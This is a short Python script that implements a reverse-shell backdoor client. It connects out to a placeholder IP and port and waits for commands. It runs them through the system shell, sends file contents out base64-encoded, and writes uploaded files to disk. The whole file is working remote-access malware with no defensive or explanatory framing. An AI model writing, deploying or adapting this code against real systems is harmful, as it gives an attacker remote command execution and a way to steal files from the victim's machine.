import socket
import subprocess
import simplejson
import os
import base64

class ThisSocket:
	def __init__(self, ip, port):
		self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.my_connection.connect((ip,port))

	def CommExc(self, command):
		return subprocess.check_output(command, shell=True)

	def Json_Send(self, data):
		json_data = simplejson.dumps(data)
		self.my_connection.send(json_data.encode("utf-8"))

	def Json_Rec(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.my_connection.recv(1024).decode()
				return simplejson.loads(json_data)
			except ValueError:
				continue

	def ExecCD(self,directory):
		os.chdir(directory)
		return "Cd to " + directory

	def FileContents(self,path):
		with open(path,"rb") as my_file:
			return base64.b64encode(my_file.read())

	def SaveFile(self,path,content):
		with open(path,"wb") as my_file:
			my_file.write(base64.b64decode(content))
			return "Download OK"

	def Socket_Start(self):
		while True:
			command = self.Json_Rec()
			try:
				if command[0] == "quit":
					self.my_connection.close()
					exit()
				elif command[0] == "cd" and len(command) > 1:
					command_output = self.ExecCD(command[1])
				elif command[0] == "download":
					command_output = self.FileContents(command[1])
				elif command[0] == "upload":
					command_output = self.SaveFile(command[1],command[2])
				else:
					command_output = self.CommExc(command)
			except Exception:
				command_output = "Error!"
			self.Json_Send(command_output)
		self.my_connection.close()

Socket_Obj = ThisSocket("IP",port)
Socket_Obj.Socket_Start()
